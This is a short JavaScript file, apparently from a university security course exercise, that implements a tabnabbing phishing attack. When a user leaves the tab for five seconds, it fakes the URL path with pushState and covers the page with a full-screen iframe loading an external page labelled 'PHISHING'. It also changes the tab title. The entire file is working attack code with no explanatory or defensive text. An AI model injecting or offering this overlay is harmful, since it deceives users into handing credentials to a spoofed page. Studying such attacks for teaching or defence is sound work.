(function(){

var TIMER = null;
var HAS_SWITCHED = false;

// Events
window.onblur = function(){
  TIMER = setTimeout(changeItUp, 5000);
}  

window.onfocus = function(){
  if(TIMER) clearTimeout(TIMER);
}

// Utils
function setTitle(text){ document.title = text; }

function createShield(url){
  window.history.pushState("http://forest.cs.purdue.edu", "HackMe", "/cs526/");
  div = document.createElement("div");
  div.style.position = "fixed";
  div.style.top = 0;
  div.style.left = 0;
  div.style.backgroundColor = "white";
  div.style.width = "100%";
  div.style.height = "100%";
  div.style.textAlign = "center";
  document.body.style.overflow = "hidden";
  
  iframe = document.createElement("iframe");
  iframe.style.position = "fixed";
  iframe.style.top = 0;
  iframe.style.left = 0;
  iframe.style.width = "100%";
  iframe.style.height = "100%";
  iframe.frameBorder = 0;
  iframe.src = url;
  
  var oldTitle = document.title;
  
  div.appendChild(iframe);
  document.body.appendChild(div);
  iframe.onSubmit = function(){
    div.parentNode.removeChild(div);
    document.body.style.overflow = "auto";
    setTitle(oldTitle);
  }
  

}

function changeItUp(){
  if( HAS_SWITCHED == false ){
    createShield("http://westcraig.com/PHISHING/index.html");
    setTitle("hackme");
    HAS_SWITCHED = true;    
  }
}
  
})();
